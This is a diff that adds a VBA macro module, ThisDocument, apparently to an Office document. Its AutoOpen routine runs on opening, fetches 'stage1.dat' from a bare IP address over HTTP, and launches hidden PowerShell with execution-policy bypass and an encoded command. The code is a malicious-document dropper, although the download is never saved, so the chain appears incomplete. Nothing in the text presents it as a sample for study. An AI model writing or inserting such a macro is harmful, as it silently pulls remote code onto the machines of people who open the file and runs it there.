@@ -1,0 +1,13 @@
+Attribute VB_Name = "ThisDocument"
+
+Sub AutoOpen()
+  Dim sh As Object
+  Set sh = CreateObject("WScript.Shell")
+  Dim x As Object
+  Set x = CreateObject("MSXML2.XMLHTTP")
+  x.Open "GET", "http://45.147.230.112/inv/stage1.dat", False
+  x.Send
+  Dim s As Object
+  Set s = CreateObject("ADODB.Stream")
+  sh.Run "powershell -nop -w hidden -ep bypass -enc SQBFAFgAKAApAA==", 0, False
+End Sub
